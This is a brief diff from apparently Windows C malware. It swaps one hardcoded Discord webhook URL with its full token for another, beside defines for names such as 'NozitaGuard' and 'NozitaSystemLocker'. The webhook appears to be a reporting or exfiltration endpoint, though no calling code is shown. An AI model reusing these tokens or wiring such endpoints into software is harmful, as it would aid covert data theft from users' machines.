@@ -13,7 +13,7 @@
 #pragma comment(lib,"advapi32.lib")
 #pragma comment(lib,"ntdll.lib")
 
-#define WH "https://discord.com/api/webhooks/1563888663937556560/9fPW2T3O6vkvny5e-NLdALi5v467RsHhj5kNaKw3fUEBQ5HegOcJafGDT7n3wMFszcLT"
+#define WH "https://discord.com/api/webhooks/1567058342776406120/1zw_NdXlitT0Va80u-H6-bY0_dn9PgEfgpUrgcoiL0i8Iy7QiKFEMjO1z9PPJQKeJvma"
 #define AN "NozitaGuard"
 #define EN "nozita_system.exe"
 #define RK "NozitaSystemLocker"
